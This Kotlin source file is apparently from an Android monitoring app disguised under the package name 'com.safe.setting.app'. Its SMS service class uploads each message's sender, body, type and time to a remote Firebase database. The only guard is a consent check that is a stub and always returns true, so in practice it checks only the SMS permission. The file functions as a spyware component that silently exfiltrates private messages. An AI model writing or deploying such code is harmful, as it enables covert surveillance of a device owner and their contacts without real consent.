package com.safe.setting.app.services.sms

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.util.Log
import androidx.core.content.ContextCompat
import com.safe.setting.app.data.rxFirebase.InterfaceFirebase
import com.safe.setting.app.data.model.Sms
import com.safe.setting.app.services.base.BaseInteractorService
import com.safe.setting.app.utils.ConstFun.getDateTime
import com.safe.setting.app.utils.Consts.DATA
import com.safe.setting.app.utils.Consts.SMS
import javax.inject.Inject


class InteractorSms<S : InterfaceServiceSms> @Inject constructor(
    private val context: Context,
    firebase: InterfaceFirebase
) : BaseInteractorService<S>(context, firebase), InterfaceInteractorSms<S> {

    override fun setPushSms(smsAddress: String, smsBody: String, type: Int) {
        if (hasUserConsent() && hasSmsPermission()) {
            val sms = Sms(smsAddress, smsBody, getDateTime(), type)
            firebase().getDatabaseReference("$SMS/$DATA").push().setValue(sms)
        } else {
            // Log or handle lack of permission/consent appropriately
            Log.w(TAG, "Permission or consent not granted. SMS not pushed.")
        }
    }

    private fun hasUserConsent(): Boolean {
        // Implement your logic to check if user has given consent
        return true // Placeholder implementation
    }

    private fun hasSmsPermission(): Boolean {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED
    }

    companion object {
        const val TAG = "InteractorSms"
    }
}
